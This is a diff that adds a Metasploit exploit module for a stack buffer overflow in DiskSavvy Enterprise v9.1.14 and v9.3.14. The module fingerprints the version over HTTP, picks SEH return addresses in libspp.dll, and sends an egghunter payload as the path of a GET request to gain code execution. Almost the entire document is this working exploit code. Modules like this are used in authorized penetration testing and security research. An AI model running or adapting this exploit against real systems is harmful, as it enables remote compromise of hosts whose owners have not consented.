@@ -1,0 +1,150 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Seh
+  include Msf::Exploit::Remote::Egghunter
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'DiskSavvy Enterprise GET Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack-based buffer overflow vulnerability
+        in the web interface of DiskSavvy Enterprise v9.1.14 and v9.3.14,
+        caused by improper bounds checking of the request path in HTTP GET
+        requests sent to the built-in web server. This module has been
+        tested successfully on Windows XP SP3 and Windows 7 SP1.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'vportal',      # Vulnerability discovery and PoC
+          'Gabor Seljan'  # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['EDB', '40869']
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00\x09\x0a\x0d\x20",
+          'Space'      => 500
+        },
+      'Targets'        =>
+        [
+          [
+            'Automatic Targeting',
+            {
+              'auto' => true
+            }
+          ],
+          [
+            'DiskSavvy Enterprise v9.1.14',
+            {
+              'Offset' => 542,
+              'Ret'    => 0x101142c0  # POP # POP # RET [libspp.dll]
+            }
+          ],
+          [
+            'DiskSavvy Enterprise v9.3.14',
+            {
+              'Offset' => 2478,
+              'Ret'    => 0x101142ff  # POP # POP # RET [libspp.dll]
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Dec 01 2016',
+      'DefaultTarget'  => 0))
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/'
+    )
+
+    if res && res.code == 200
+      version = res.body[/Disk Savvy Enterprise v[^<]*/]
+      if version
+        vprint_status("Version detected: #{version}")
+        if version =~ /9\.(1|3)\.14/
+          return Exploit::CheckCode::Appears
+        end
+        return Exploit::CheckCode::Detected
+      end
+    else
+      vprint_error('Unable to determine due to a HTTP connection timeout')
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    mytarget = target
+
+    if target['auto']
+      mytarget = nil
+
+      print_status('Automatically detecting the target...')
+
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => '/'
+      )
+
+      if res && res.code == 200
+        if res.body =~ /Disk Savvy Enterprise v9\.1\.14/
+          mytarget = targets[1]
+        elsif res.body =~ /Disk Savvy Enterprise v9\.3\.14/
+          mytarget = targets[2]
+        end
+      end
+
+      if !mytarget
+        fail_with(Failure::NoTarget, 'No matching target')
+      end
+
+      print_status("Selected target: #{mytarget.name}")
+    end
+
+    eggoptions = {
+      checksum: true,
+      eggtag: rand_text_alpha(4, payload_badchars)
+    }
+
+    hunter, egg = generate_egghunter(
+      payload.encoded,
+      payload_badchars,
+      eggoptions
+    )
+
+    sploit =  make_nops(10)
+    sploit << egg
+    sploit << rand_text_alpha(mytarget['Offset'] - egg.length)
+    sploit << generate_seh_record(mytarget.ret)
+    sploit << make_nops(8)
+    sploit << hunter
+    sploit << rand_text_alpha(4500)
+
+    print_status('Sending malicious request...')
+
+    send_request_cgi(
+      'method' => 'GET',
+      'uri'    => sploit
+    )
+  end
+end
